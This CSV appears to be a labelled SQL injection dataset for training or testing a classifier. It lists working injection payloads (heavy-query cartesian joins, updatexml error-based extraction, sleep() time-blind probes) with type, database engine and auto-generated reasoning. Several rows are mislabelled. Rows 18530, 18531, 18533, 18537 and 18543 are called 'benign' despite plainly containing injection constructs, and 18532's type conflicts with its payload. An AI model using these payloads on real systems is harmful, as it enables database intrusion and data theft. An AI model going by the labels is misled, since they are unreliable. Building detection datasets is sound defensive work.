id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
18526,"1%"" ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.7,Payload contains token 'count(*) from 5 tables' → maps to heavy_query per priority table; DB signature → oracle. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18527,"1"" and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ""wtkx"" = ""wtkx",heavy_query,generic,0.7,Payload contains token 'count(*) from 7 tables' → maps to heavy_query per priority table; DB signature → generic. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18528,"1' ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( 'rpof' like 'rpof",error_based,mysql,0.7,Payload contains token 'updatexml' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.,1
18529,"1 ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.7,Payload contains token 'count(*) from 7 tables' → maps to heavy_query per priority table; DB signature → generic. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18530,"1' ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 'cpfn' like 'cpfn",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18531,"1"" ) ) as gawq where 4728 = 4728 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",benign,db2,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=db2.",1
18532,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'conm' like 'conm",boolean_blind,db2,0.95,Payload contains token 'and ... like ...' → maps to boolean_blind per priority table; DB signature → db2. Boolean-based blind (P3): tautology/regex/elt branches yield true/false used to infer bits.,3
18533,-3688'|| ( select 'pber' from dual where 7137 = 7137 order by 1#,benign,oracle,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=oracle.",1
18534,"1 ) ) as tuxy where 6855 = 6855 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.7,Payload contains token 'count(*) from 4 tables' → maps to heavy_query per priority table; DB signature → firebird. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18535,1'|| ( select 'vxfx' where 7038 = 7038 and 9306 = 4187 ) ||',boolean_blind,generic,0.95,Payload contains token 'and 9306 = 4187' → maps to boolean_blind per priority table; DB signature → generic. Boolean-based blind (P3): tautology/regex/elt branches yield true/false used to infer bits.,3
18536,"1 ) as iupg where 2861 = 2861 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.7,Payload contains token 'count(*) from 7 tables' → maps to heavy_query per priority table; DB signature → generic. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18537,"1"" ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ""ampn"" like ""ampn",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18538,"1%"" ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""%"" = """,heavy_query,oracle,0.7,Payload contains token 'count(*) from 5 tables' → maps to heavy_query per priority table; DB signature → oracle. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18539,"1%' ) ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,0.7,Payload contains token 'sleep(' → maps to time_blind per priority table; DB signature → mysql. Time-based blind injection (P5): the function induces measurable delay for inference.,1
18540,"1%"" and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,0.7,Payload contains token 'sleep(' → maps to time_blind per priority table; DB signature → mysql. Time-based blind injection (P5): the function induces measurable delay for inference.,1
18541,"1"" ) ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.7,Payload contains token 'count(*) from 7 tables' → maps to heavy_query per priority table; DB signature → generic. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18542,"1, ( select ( case when ( 2106 = 2106 ) then ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) else 2106* ( select 2106 from master..sysdatabases ) end ) )",heavy_query,mssql,0.7,Payload contains token 'count(*) from 7 tables' → maps to heavy_query per priority table; DB signature → mssql. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18543,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ""%"" = """,benign,firebird,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=firebird.",1
